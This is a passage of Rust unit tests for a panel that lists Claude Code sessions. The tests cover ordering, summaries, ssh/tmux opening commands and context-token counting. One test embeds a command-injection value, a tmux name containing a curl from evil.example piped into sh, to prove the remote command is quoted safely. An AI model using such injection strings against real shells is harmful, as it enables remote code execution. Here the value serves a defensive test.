        let tmp = std::env::temp_dir().join(format!("savras-repo-{}", std::process::id()));
        let repo = tmp.join("myrepo");
        let inside = repo.join("src").join("deep");
        let tree = repo.join(".claude").join("worktrees").join("fix-thing");
        std::fs::create_dir_all(repo.join(".git")).unwrap();
        std::fs::create_dir_all(&inside).unwrap();
        std::fs::create_dir_all(&tree).unwrap();
        std::fs::write(
            tree.join(".git"),
            format!("gitdir: {}/.git/worktrees/fix-thing\n", repo.display()),
        )
        .unwrap();

        assert_eq!(repo_of(&repo), "myrepo");
        // From anywhere inside it, which is where sessions actually run.
        assert_eq!(repo_of(&inside), "myrepo");
        // And from a worktree of it, whatever the worktree is called.
        assert_eq!(repo_of(&tree), "myrepo");

        // Outside any repository there is only the directory's own name.
        let loose = tmp.join("nowhere");
        std::fs::create_dir_all(&loose).unwrap();
        assert_eq!(repo_of(&loose), "nowhere");

        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn the_order_does_not_move_when_a_session_merely_works() {
        // The list is navigated, not just read: the switch keys walk it, and
        // rows that reshuffle every few seconds make that a lottery. Only a
        // change of *status* may move a row.
        let f = Fixture::new("job-stable")
            .job(
                "a",
                r#"{"state":"working","name":"ZEBRA","updatedAt":"2026-01-01T00:00:00Z"}"#,
            )
            .job(
                "b",
                r#"{"state":"working","name":"ALPHA","updatedAt":"2020-01-01T00:00:00Z"}"#,
            );

        let names =
            |s: &Snapshot| -> Vec<String> { s.jobs.iter().map(|j| j.name.clone()).collect() };
        assert_eq!(names(&load(&f.0).unwrap()), ["ALPHA", "ZEBRA"]);

        // ZEBRA does some work and rewrites its timestamp. The order must not
        // care: freshest-first is what made the panel shuffle underfoot.
        std::fs::write(
            f.0.join("b").join("state.json"),
            r#"{"state":"working","name":"ALPHA","updatedAt":"2030-01-01T00:00:00Z"}"#,
        )
        .unwrap();
        assert_eq!(names(&load(&f.0).unwrap()), ["ALPHA", "ZEBRA"]);
    }

    #[test]
    fn a_change_of_status_does_not_move_a_row() {
        let f = Fixture::new("job-status-moves")
            .job(
                "a",
                r#"{"state":"working","name":"ALPHA","createdAt":"2026-09-22T08:00:00Z"}"#,
            )
            .job(
                "b",
                r#"{"state":"working","name":"BETA","createdAt":"2026-09-22T09:00:00Z"}"#,
            );
        let names =
            |s: &Snapshot| -> Vec<String> { s.jobs.iter().map(|j| j.name.clone()).collect() };
        assert_eq!(names(&load(&f.0).unwrap()), ["ALPHA", "BETA"]);

        // BETA starts asking. It is still the younger session, so it stays
        // where it was: the panel says what is asking in the row itself, and
        // a row that moves as you reach for it is worse than one that waits.
        std::fs::write(
            f.0.join("b").join("state.json"),
            r#"{"state":"working","name":"BETA","needs":"answer: which?","createdAt":"2026-09-22T09:00:00Z"}"#,
        )
        .unwrap();
        assert_eq!(names(&load(&f.0).unwrap()), ["ALPHA", "BETA"]);
    }

    #[test]
    fn the_oldest_session_is_first_and_an_undated_one_is_last() {
        let f = Fixture::new("groups")
            .job(
                "aaa",
                r#"{"state":"working","name":"WORK","detail":"building","createdAt":"2026-09-22T09:00:00Z"}"#,
            )
            .job(
                "bbb",
                r#"{"state":"working","name":"ASK","detail":"d","needs":"answer: which one?","createdAt":"2026-09-22T10:00:00Z"}"#,
            )
            .job(
                "ccc",
                r#"{"state":"done","name":"FIN","output":{"result":"shipped"},"createdAt":"2026-09-22T08:00:00Z"}"#,
            )
            // No start time to be had: it sorts after the dated ones rather
            // than passing for the oldest session on the machine.
            .job("ddd", r#"{"state":"working","name":"NODATE"}"#);
        let snap = load(&f.0).unwrap();

        assert_eq!(
            snap.jobs
                .iter()
                .map(|j| j.name.as_str())
                .collect::<Vec<_>>(),
            ["FIN", "WORK", "ASK", "NODATE"]
        );
        assert_eq!(snap.jobs[2].status, Status::NeedsInput, "asking, and third");
    }

    #[test]
    fn summary_comes_from_the_field_that_matters_for_the_status() {
        let f = Fixture::new("summary")
            .job(
                "aaa",
                r#"{"state":"working","name":"ASK","detail":"d","needs":"answer: which?"}"#,
            )
            .job(
                "bbb",
                r#"{"state":"done","name":"FIN","detail":"d","output":{"result":"shipped"}}"#,
            )
            .job(
                "ccc",
                r#"{"state":"working","name":"RUN","detail":"compiling"}"#,
            );
        let snap = load(&f.0).unwrap();
        let by = |n: &str| {
            snap.jobs
                .iter()
                .find(|j| j.name == n)
                .unwrap()
                .summary
                .clone()
        };

        assert_eq!(by("ASK"), "answer: which?"); // the question, not the activity
        assert_eq!(by("FIN"), "shipped"); // the result, not the last activity
        assert_eq!(by("RUN"), "compiling");
    }

    #[test]
    fn a_finished_job_is_finished_even_if_it_was_asking() {
        let f = Fixture::new("done-asking").job(
            "aaa",
            r#"{"state":"done","name":"X","needs":"answer: ?","output":{"result":"ok"}}"#,
        );
        let snap = load(&f.0).unwrap();
        assert_eq!(snap.jobs[0].status, Status::Done);
    }

    #[test]
    fn multiline_summaries_become_one_line() {
        let f = Fixture::new("multiline").job(
            "aaa",
            "{\"state\":\"working\",\"name\":\"X\",\"detail\":\"a\\nb   c\"}",
        );
        let snap = load(&f.0).unwrap();
        assert_eq!(snap.jobs[0].summary, "a b c");
    }

    #[test]
    fn unreadable_jobs_are_skipped_not_fatal() {
        let f = Fixture::new("bad")
            .job("aaa", "{ this is not json")
            .job("bbb", r#"{"state":"working","name":"GOOD"}"#);
        std::fs::write(f.0.join("pins.json"), "[]").unwrap(); // a file, not a job
        std::fs::create_dir_all(f.0.join("empty")).unwrap(); // a dir with no state

        let snap = load(&f.0).unwrap();
        assert_eq!(snap.jobs.len(), 1);
        assert_eq!(snap.jobs[0].name, "GOOD");
    }

    #[test]
    fn missing_jobs_dir_is_an_empty_panel_not_an_error() {
        let snap = load(std::path::Path::new("/nonexistent/savras/jobs")).unwrap();
        assert!(snap.is_empty());
    }

    #[test]
    fn unknown_fields_do_not_break_parsing() {
        // A Claude Code upgrade adding fields must not blank the panel.
        let f = Fixture::new("future").job(
            "aaa",
            r#"{"state":"working","name":"X","detail":"d","brandNewField":{"a":1}}"#,
        );
        assert_eq!(load(&f.0).unwrap().jobs[0].name, "X");
    }

    #[test]
    fn the_footer_says_the_machine_and_the_window_rather_than_the_whole_ssh() {
        let mut job = load(
            &Fixture::new("remote-footer")
                .job("aaa", r#"{"state":"working","name":"A"}"#)
                .0,
        )
        .unwrap()
        .jobs
        .remove(0);
        job.machine = Some(Remote {
            host: "claude-box".to_string(),
            tmux: Some("webapp:@2.%2".to_string()),
            pid: Some(4242),
        });
        assert_eq!(
            job.open_command_line(),
            "ssh claude-box · tmux webapp:@2.%2"
        );
    }

    #[test]
    fn a_session_on_another_machine_is_opened_through_tmux() {
        // The box has no daemon and no jobs directory — `claude attach` has
        // nothing to attach to there. What it has is tmux, and the session's
        // own json says which window.
        let remote = Remote {
            host: "claude-box".to_string(),
            tmux: Some("webapp:@2.%2".to_string()),
            pid: Some(4242),
        };
        let command = remote.open_command();

        assert_eq!(command[0], "ssh");
        // A tty, or tmux refuses to attach at all.
        assert!(command.contains(&"-t".to_string()), "{command:?}");
        assert!(command.contains(&"claude-box".to_string()), "{command:?}");

        let script = command.last().unwrap();
        // Grouped, not attached: the user is already attached from their own
        // terminal, and a second client would force both to the smaller size.
        // Quoted only where quoting says something: an ordinary session name
        // is one word already, and the command is meant to be readable.
        assert!(script.contains("new-session -t webapp"), "{script}");
        assert!(script.contains("select-window -t @2"), "{script}");
        // And it takes itself away when the tab closes, so the panel does not
        // litter the machine with grouped sessions.
        assert!(script.contains("destroy-unattached on"), "{script}");
        // Escaped, because the remote shell would otherwise end the command
        // at the semicolon instead of handing tmux one.
        assert!(script.contains("\\;"), "{script}");
    }

    #[test]
    fn a_tmux_name_cannot_become_a_second_command() {
        // The target is read from `sessions/<pid>.json` on the far side and
        // spent in a string that box's shell evaluates. Hand-written quotes
        // let a session name end the string and start a command of its own.
        let remote = Remote {
            host: "claude-box".to_string(),
            tmux: Some("a';curl evil.example|sh;'x:@1.%1".to_string()),
            pid: Some(4242),
        };
        let script = remote.open_command().last().unwrap().clone();

        // Proof rather than shape: give the string to a real shell, with
        // `tmux` swapped for something that says what words it was handed.
        // Unquoted, the `;curl` half runs as a command of its own.
        let out = std::process::Command::new("sh")
            .arg("-c")
            .arg(script.replacen("tmux ", "printf '[%s]' ", 1))
            .output()
            .expect("running sh");
        let said = String::from_utf8_lossy(&out.stdout);
        assert!(
            said.contains("[a';curl evil.example|sh;'x]"),
            "the target should arrive as one word: {said}"
        );
    }

    #[test]
    fn a_machine_with_no_tmux_window_is_still_worth_opening() {
        let remote = Remote {
            host: "claude-box".to_string(),
            tmux: None,
            pid: Some(4242),
        };
        let script = remote.open_command().last().unwrap().clone();
        assert!(script.contains("SHELL"), "{script}");
    }

    #[test]
    fn a_daemon_session_is_attached_not_resumed() {
        // Claude Code refuses to resume a session its daemon is running, and
        // says so: "run `claude attach <id>` to open it".
        let f = Fixture::new("attach").job(
            "aaa",
            r#"{"state":"working","name":"PLAN","backend":"daemon",
                "daemonShort":"7baedc84","sessionId":"7baedc84-3c4c-4276-8bd6-5a781df04f48"}"#,
        );
        let job = &load(&f.0).unwrap().jobs[0];
        assert_eq!(job.open_command(), ["claude", "attach", "7baedc84"]);
        assert_eq!(job.open_command_line(), "claude attach 7baedc84");
    }

    #[test]
    fn a_session_without_a_daemon_is_resumed() {
        let f = Fixture::new("resume").job(
            "aaa",
            r#"{"state":"done","name":"OLD","sessionId":"abc-123"}"#,
        );
        let job = &load(&f.0).unwrap().jobs[0];
        assert_eq!(job.open_command(), ["claude", "--resume", "abc-123"]);
    }

    #[test]
    fn a_daemon_session_missing_its_short_id_falls_back_to_resume() {
        let f = Fixture::new("attach-noshort").job(
            "aaa",
            r#"{"state":"working","name":"X","backend":"daemon","sessionId":"abc"}"#,
        );
        let job = &load(&f.0).unwrap().jobs[0];
        assert_eq!(job.open_command(), ["claude", "--resume", "abc"]);
    }

    #[test]
    fn the_context_is_read_from_the_transcript_not_from_the_state_file() {
        // `tokens` in state.json is not what the session is holding. Measured
        // on one real session it said 154k against a true 387k, and on another
        // 78k against 185k — wrong in both directions, so no correction factor
        // would have saved it. The truth is the last message's usage, which is
        // also the number Claude Code puts in its own status line.
        let dir = std::env::temp_dir().join(format!("savras-ctx-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let transcript = dir.join("t.jsonl");
        std::fs::write(
            &transcript,
            // A sub-agent's turn after the real one: it has a context of its
            // own, and the row is about the session.
            r#"{"message":{"usage":{"input_tokens":2,"output_tokens":78,"cache_creation_input_tokens":891,"cache_read_input_tokens":385868}}}
{"isSidechain":true,"message":{"usage":{"input_tokens":10,"output_tokens":10,"cache_read_input_tokens":1000}}}
"#,
        )
        .unwrap();

        assert_eq!(context_used(&transcript), Some(386_839));

        let f = Fixture::new("job-context").job(
            "aaa",
            &format!(
                r#"{{"state":"working","name":"BOOKS","tokens":154268,
                     "respawnFlags":["--model","opus[1m]"],
                     "linkScanPath":"{}"}}"#,
                transcript.display()
            ),
        );
        let job = &load(&f.0).unwrap().jobs[0];
        assert_eq!(job.context(), 386_839, "the transcript wins");
        assert_eq!(
            job.context_percent(),
            Some(39),
            "387k of a million, as the session says"
        );

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn a_session_of_your_own_that_has_spent_nothing_says_so() {
        // Blank was mistaken for a bug, and fairly: a local session always has
        // a count, so nothing to show means nothing was counted — which is
        // only ever true of a session on another machine.
        let f = Fixture::new("job-zero").job("aaa", r#"{"state":"working","name":"NEW"}"#);
        let job = &load(&f.0).unwrap().jobs[0];
        assert_eq!(job.context_percent(), Some(0));
    }

    #[test]
    fn the_window_falls_back_to_the_configured_model() {
        // A session started without `--model` runs on the default. Measuring
        // it against 200k when the default is a million is how a session at
        // 18% came to read 39%.
        assert_eq!(context_window(Some("opus[1m]")), 1_000_000);
        assert_eq!(context_window(Some("opus")), 200_000);
        assert_eq!(context_window(None), 200_000);

        let claude = std::env::temp_dir().join(format!("savras-model-{}", std::process::id()));
        std::fs::create_dir_all(&claude).unwrap();
        std::fs::write(
            claude.join("settings.json"),
            r#"{"theme":"dark","model":"opus[1m]"}"#,
        )
        .unwrap();
        assert_eq!(default_model(&claude).as_deref(), Some("opus[1m]"));
        std::fs::remove_dir_all(&claude).ok();
    }

    #[test]
    fn ages_are_compact() {
        let now = DateTime::parse_from_rfc3339("2026-09-05T12:00:00Z")
            .unwrap()
            .with_timezone(&Utc);
        let ago = |s: i64| Some(now - chrono::Duration::seconds(s));
        assert_eq!(age(ago(5), now), "5s");
        assert_eq!(age(ago(59), now), "59s");
        assert_eq!(age(ago(60), now), "1m");
        assert_eq!(age(ago(3599), now), "59m");
        assert_eq!(age(ago(3600), now), "1h");
        assert_eq!(age(ago(86_400), now), "1d");
        assert_eq!(age(ago(-10), now), "0s"); // clock skew must not underflow
        assert_eq!(age(None, now), "-");
    }
}
